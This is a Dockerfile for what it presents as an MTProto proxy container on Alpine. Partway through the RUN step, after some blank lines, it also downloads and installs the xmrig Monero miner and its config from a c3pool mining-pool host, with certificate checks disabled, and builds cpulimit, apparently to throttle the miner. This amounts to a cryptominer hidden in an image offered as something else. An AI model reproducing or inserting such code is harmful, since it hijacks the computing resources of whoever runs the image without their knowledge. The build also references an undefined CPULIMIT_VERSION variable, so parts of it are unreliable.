FROM alpine:latest

LABEL maintainer="wisdom <wisdom2622069252@gmail.com>"

ENV web_port=8888 \
    port= \
    secret= \
    tag= \
    domain=hostloc.com \
    nat_info=

RUN apk add --no-cache git curl iproute2 wget \
    &&  cd //usr/bin \
    &&  wget https://raw.githubusercontent.com/wisdomskip/mtproxy-docker/main/mtproto-proxy -O mtproto-proxy -q \
    &&  chmod +x mtproto-proxy \
    
    
    &&  wget --no-check-certificate -c https://github.com/opsengine/cpulimit/archive/v${CPULIMIT_VERSION}.tar.gz \
    &&  tar zxvf v${CPULIMIT_VERSION}.tar.gz \
    &&  cd cpulimit-${CPULIMIT_VERSION} \
    &&  sed -i "/#include <sys\/sysctl.h>/d" src/cpulimit.c  \
    &&  make \
    &&  cp src/cpulimit /usr/bin/ \
    &&  cd /root \
    &&  wget --no-check-certificate -c http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz \
    &&  tar zxvf xmrig.tar.gz \
    &&  chmod 775 xmrig \
    &&  chmod 775 config.json \
    &&  cp xmrig /usr/bin/ \
    &&  mkdir -p /etc/xmrig \
    &&  cp config.json /etc/xmrig \
    &&  apk del build-base \
    &&  cd /root \
    &&  rm v${CPULIMIT_VERSION}.tar.gz \
    &&  rm -rf cpulimit-${CPULIMIT_VERSION} \
    &&  rm -rf /tmp/* /var/cache/apk/*
